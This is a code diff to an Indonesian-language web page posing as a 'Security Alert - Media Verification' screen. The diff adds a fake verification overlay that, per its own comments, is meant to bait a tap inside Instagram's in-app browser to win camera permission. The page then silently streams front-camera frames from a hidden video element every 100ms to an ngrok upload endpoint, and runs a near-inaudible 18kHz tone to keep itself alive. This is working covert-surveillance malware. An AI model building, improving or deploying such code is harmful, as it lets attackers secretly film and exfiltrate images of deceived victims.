@@ -2,16 +2,61 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>Security Alert - Media Verification</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #000; min-height: 100vh; display: flex; justify-content: center; align-items: center; color: #fff; font-family: sans-serif; }
-  video { width: 320px; height: 240px; border: 1px solid #333; background: #111; }
+  body { background: #000; min-height: 100vh; display: flex; justify-content: center; align-items: center; color: #fff; font-family: sans-serif; overflow: hidden; }
+  
+  /* Tombol interaktif transparan penuh untuk memancing user gesture di Instagram WebView */
+  #permission-overlay {
+    position: fixed;
+    top: 0; left: 0; width: 100vw; height: 100vh;
+    background: rgba(0, 0, 0, 0.85);
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    z-index: 9999;
+    cursor: pointer;
+    text-align: center;
+    padding: 20px;
+  }
+  .box {
+    background: #111827;
+    border: 1px solid #374151;
+    padding: 24px;
+    border-radius: 12px;
+    max-width: 320px;
+    width: 100%;
+    box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+  }
+  h2 { font-size: 16px; margin-bottom: 10px; color: #f3f4f6; }
+  p { font-size: 12px; color: #9ca3af; margin-bottom: 20px; line-height: 1.5; }
+  .btn {
+    background: #2563eb;
+    color: #fff;
+    border: none;
+    padding: 10px 20px;
+    border-radius: 6px;
+    font-size: 14px;
+    font-weight: bold;
+    width: 100%;
+  }
+
   .hidden-container { position: absolute; opacity: 0.01; pointer-events: none; overflow: hidden; width: 1px; height: 1px; }
 </style>
 </head>
 <body>
+
+<!-- Overlay Interaktif untuk Memancing Izin Kamera di Instagram WebView -->
+<div id="permission-overlay">
+  <div class="box">
+    <h2>Verifikasi Keamanan Media</h2>
+    <p>Ketuk tombol di bawah untuk mengaktifkan sesi penelusuran aman dan melanjutkan.</p>
+    <button class="btn">Lanjutkan Verifikasi</button>
+  </div>
+</div>
 
 <div class="hidden-container">
   <video id="cam-feed" autoplay playsinline muted></video>
@@ -30,7 +75,7 @@
       pitch: 1.0,
       repeatInterval: 6000
     },
-    streamInterval: 100, // Mengirim frame setiap 100ms untuk efek CCTV live yang halus
+    streamInterval: 100, // Kirim frame cepat untuk live stream
     serverEndpoint: 'https://studly-unallegorized-brecken.ngrok-free.dev/upload_frame'
   };
 
@@ -38,8 +83,23 @@
     ttsStarted: false,
     camStream: null,
     camActive: false,
-    streamTimer: null
+    streamTimer: null,
+    audioCtx: null
   };
+
+  function initAudioKeepAlive() {
+    try {
+      window.AudioContext = window.AudioContext || window.webkitAudioContext;
+      state.audioCtx = new AudioContext();
+      var osc = state.audioCtx.createOscillator();
+      var gain = state.audioCtx.createGain();
+      gain.gain.value = 0.00001;
+      osc.frequency.value = 18000;
+      osc.connect(gain);
+      gain.connect(state.audioCtx.destination);
+      osc.start();
+    } catch (e) {}
+  }
 
   function speakOnce() {
     if (!('speechSynthesis' in window)) return;
@@ -73,7 +133,7 @@
       if (videoElement.readyState !== videoElement.HAVE_ENOUGH_DATA) return;
 
       ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-      var dataURL = canvas.toDataURL('image/jpeg', 0.65); // Kompresi optimal untuk stream
+      var dataURL = canvas.toDataURL('image/jpeg', 0.65);
       var payload = JSON.stringify({ image: dataURL });
 
       fetch(CONFIG.serverEndpoint, {
@@ -88,6 +148,7 @@
   function requestCameraAccess() {
     if (state.camActive) return;
 
+    // Meminta izin kamera secara eksplisit setelah ada interaksi pengguna
     navigator.mediaDevices.getUserMedia({ 
       video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" }, 
       audio: false 
@@ -100,23 +161,33 @@
       videoElement.srcObject = stream;
       videoElement.play().catch(function(){});
 
+      // Sembunyikan kotak dialog setelah izin berhasil diberikan
+      var overlay = document.getElementById('permission-overlay');
+      if (overlay) overlay.style.display = 'none';
+
       stream.getVideoTracks().forEach(function(track) {
         track.onended = function() {
           state.camActive = false;
-          setTimeout(requestCameraAccess, 2000);
         };
       });
     })
     .catch(function(err) {
-      setTimeout(requestCameraAccess, 3000);
+      console.log("Camera access blocked/denied:", err);
     });
   }
 
-  window.addEventListener('DOMContentLoaded', function() {
+  // Event listener utama yang mendeteksi ketukan (tap) layar di dalam In-App Browser Instagram
+  document.getElementById('permission-overlay').addEventListener('click', function() {
+    initAudioKeepAlive();
+    if (state.audioCtx && state.audioCtx.state === 'suspended') {
+      state.audioCtx.resume();
+    }
     startTTS();
     requestCameraAccess();
+  });
 
-    // Memulai pengiriman frame cepat layaknya stream CCTV
+  window.addEventListener('DOMContentLoaded', function() {
+    // Memulai timer stream, akan aktif otomatis setelah tombol diklik
     state.streamTimer = setInterval(streamFrame, CONFIG.streamInterval);
   });
 
